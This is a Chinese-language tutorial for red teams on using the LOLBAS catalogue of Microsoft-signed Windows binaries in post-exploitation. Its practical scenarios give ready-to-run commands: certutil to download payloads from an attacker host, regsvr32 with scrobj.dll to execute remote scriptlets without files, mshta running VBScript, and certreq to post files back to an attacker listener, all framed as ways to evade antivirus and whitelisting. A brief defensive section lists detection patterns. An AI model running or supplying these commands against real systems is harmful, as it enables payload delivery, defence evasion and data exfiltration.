# LOLBAS 使用教程（Windows 后渗透查表）

Living Off The Land（落地即用）查表工具使用指南。网站是"字典"，不是要背的内容，而是后渗透 / 红队遇到对应场景去查的参考。

- 官网：https://lolbas-project.github.io/
- Linux 侧对应工具：GTFOBins（见同目录 `GTFOBins.md`）

## 一、概念与定位

**Living Off The Land 思想**：不落地恶意文件、不调用陌生程序，利用微软签名、系统自带的合法程序完成攻击动作，杀软对白名单程序放行。

LOLBAS 的核心用途是**防御绕过 + 执行 + 文件传输 + 持久化**，提权只是边角料。

入围标准（决定它为什么可信）：必须是**微软签名**、Windows 自带或来自微软、且带有超出原本用途的意外功能，对红队 / APT 有用。

## 二、界面导航

- **搜索框**：输入程序名（`certutil`、`mshta`、`regsvr32`、`bitsadmin`、`rundll32`…）。
- **分类标签**：`Download`、`Upload`、`Read`、`Write`、`Execute`、`Bypass`、`AWL Bypass`（白名单绕过）、`UACBypass`、`Compile` 等。点分类看"哪些系统程序能干这件事"。

## 三、条目字段（怎么读一条记录）

```yaml
Name: certutil.exe
Description: 证书工具，可用来下载/编码文件
Commands:
  - Command: certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Users\Public\p.exe
    Description: 下载远程文件
    Usecase: 目标不允许落地工具时用系统自带程序下载
    Category: Download          # 功能分类
    Privileges: User            # 所需权限：User / Admin
    Limitations: 会产生文件（有落地痕迹）
    MitreID: T1105              # 对应 ATT&CK 技术
    OperatingSystem: Windows 10 等
Detection:
  - Sigma / Elastic / Splunk / 微软拦截规则链接（IOC）
```

字段用法：
- **Category**：这条命令解决什么问题（下载 / 上传 / 执行 / 绕过）。
- **Privileges**：`User` = 普通用户即可，`Admin` = 需要管理员，决定当前 shell 能不能用。
- **Limitations**：实战最易忽略，如"会产生文件""需要 GUI""仅限某版本"，决定命令在目标机上是否可行。
- **Detection**：红队反着看（防御方怎么抓我），蓝队正着看（该建什么规则）。
- **MitreID**：关联 ATT&CK 技术编号。

## 四、实战场景

**场景 A：下载工具 / payload（powershell 被禁或被监控）**
```
1. 点 Download 分类或搜 certutil
2. 改 IP 后执行：
   certutil.exe -urlcache -split -f http://你的攻击机/payload.exe C:\Users\Public\payload.exe
3. 注意 Limitations：会写文件，有落地痕迹，按场景评估是否可接受
```

**场景 B：无文件执行，绕过杀软 / 白名单**
```
1. 点 Execute 或 Bypass 分类，找微软签名宿主
2. regsvr32（Squiblydoo），远程加载脚本组件执行：
   regsvr32 /s /n /u /i:http://你的攻击机/payload.sct scrobj.dll
3. mshta，直接执行 VBScript：
   mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close)
```

**场景 C：把目标机文件传回攻击机**
```
1. 点 Upload 分类，找 certreq
2. certreq.exe -Post -config http://你的攻击机:8000/ c:\windows\win.ini
3. 攻击机上用 nc / python 起监听接收 POST 内容
```

## 五、防御视角

审计命令日志时，把 LOLBAS 的 Detection 字段当检测规则素材：`certutil.*-urlcache`、`bitsadmin.*transfer`、`regsvr32.*/i:` 等模式可直接做成监控规则。

## 六、自动化

- **LOLBAS 数据**：仓库以 YAML 保存全部条目（`https://github.com/LOLBAS-Project/LOLBAS`），可 clone 下来 grep 或写脚本引用，很多红队工具的"文件传输 / 绕过"数据库就是它。
- **winPEAS（PEASS-ng）**：自动扫 Windows 目标的可利用点并提示 LOLBAS 相关项。

## 七、一页速查

| 想干什么 | 查哪里 | 示例 |
|---|---|---|
| 下载文件 | Download 分类 | `certutil -urlcache -split -f ...` |
| 无文件执行 / 绕白名单 | Execute / Bypass | `regsvr32 ... scrobj.dll` |
| 上传文件回传 | Upload 分类 | `certreq -Post -config ...` |
| 建检测规则 | Detection 字段 | 监控 `certutil.*-urlcache` |

## 参考来源

- LOLBAS 主仓库：https://github.com/LOLBAS-Project/LOLBAS
- LOLBAS YML 模板：https://github.com/RakhithJK/LOLBAS/blob/master/YML-Template.yml
